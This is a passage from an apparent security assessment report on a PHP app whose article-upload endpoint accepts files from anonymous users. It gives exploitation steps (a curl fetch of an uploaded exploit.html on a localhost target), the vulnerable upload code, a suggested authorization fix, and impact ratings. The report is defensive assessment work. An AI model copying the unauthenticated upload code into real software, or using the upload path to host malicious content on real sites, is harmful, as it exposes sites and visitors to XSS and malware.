# Step 4: Exploitation - Access uploaded malicious content
curl -s http://localhost:36367/posts/uploads/exploit.html
# Result: Malicious content is accessible and would execute in victim browsers

# Step 5: Impact - Demonstrate privilege escalation
# Anonymous user (privilege level 0) successfully performed file upload operation
# that should require admin/moderator privileges (privilege level 2-3)
```

**Root Cause Analysis:**

Examining the vulnerable code at `/var/www/html/posts/upload-article.php`:

```php
// Line 8-27: File upload processing
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = trim($_POST["name"]);
    $email = trim($_POST["email"]);

    // Input validation for name and email (lines 10-21)
    // ... validation code ...

    // File upload processing (lines 24-27)
    if (isset($_FILES["articleFile"]) && $_FILES["articleFile"]["error"] == 0) {
        $target_dir = "./uploads/";
        $target_file = $target_dir . basename($_FILES["articleFile"]["name"]);
        move_uploaded_file($_FILES["articleFile"]["tmp_name"], $target_file);
        // ^^^ CRITICAL: No authorization check before this privileged operation
    }
}
```

**Missing Security Controls:**
1. No `session_start()` call to establish authentication context
2. No `$_SESSION['user_id']` check to verify user is authenticated
3. No role verification (e.g., `$_SESSION['role'] === 'admin'`)
4. No authorization guard between validation (line 24) and privileged operation (line 27)

**What Should Be Present:**
```php
// Required authorization check (MISSING from current code):
session_start();
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die("Authentication required");
}
if ($_SESSION['role'] !== 'admin' && $_SESSION['role'] !== 'moderator') {
    http_response_code(403);
    die("Insufficient privileges - admin or moderator role required");
}
// Only after authorization check should file upload proceed
```

**Notes:**

**Partial Mitigation Present:**
The `/posts/uploads/.htaccess` file contains: `<FilesMatch "\.php$"> SetHandler none </FilesMatch>`

This prevents direct PHP code execution in the uploads directory, mitigating remote code execution risk. However, this does NOT address the core authorization vulnerability - anonymous users can still:
- Upload arbitrary HTML files with XSS payloads
- Consume disk space with large file uploads
- Host malicious content for phishing or malware distribution
- Overwrite existing files if filenames collide

**Business Impact:**
- **Confidentiality:** LOW - No direct data exfiltration, but uploaded content could be used for phishing
- **Integrity:** HIGH - Attackers can inject malicious content into the application's web directory
- **Availability:** MEDIUM - Disk exhaustion possible through repeated large file uploads
- **Reputation:** HIGH - Malicious content hosted on organization's domain damages trust

**Remediation Priority:** HIGH - This is a fundamental authorization flaw that violates the principle of least privilege and enables multiple attack vectors.
